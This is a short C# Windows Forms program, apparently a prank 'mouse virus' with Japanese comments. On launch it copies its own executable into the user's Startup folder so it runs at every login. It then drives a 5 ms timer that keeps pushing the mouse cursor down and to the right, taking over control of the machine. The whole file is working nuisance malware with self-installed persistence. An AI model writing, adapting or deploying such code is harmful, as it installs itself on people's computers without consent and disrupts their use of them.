using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace MouseVirus
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			InitializeComponent();

			// ファイルパス取得
			string ownExePath = System.Reflection.Assembly.GetEntryAssembly().Location;
			string ownExeName = Path.GetFileName(ownExePath);
			string destPath = Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.Startup), ownExeName);

			// ファイルコピー
			if (!File.Exists(destPath))
			{
				File.Copy(ownExePath, destPath);
			}

			// タイマー起動
			tmMouseMove.Interval = 5;
			tmMouseMove.Start();
		}

		private void tmMouseMove_Tick(object sender, EventArgs e)
		{
			int x = System.Windows.Forms.Cursor.Position.X;
			int y = System.Windows.Forms.Cursor.Position.Y;
			x += 2;
			y += 2;
			System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
		}
	}
}
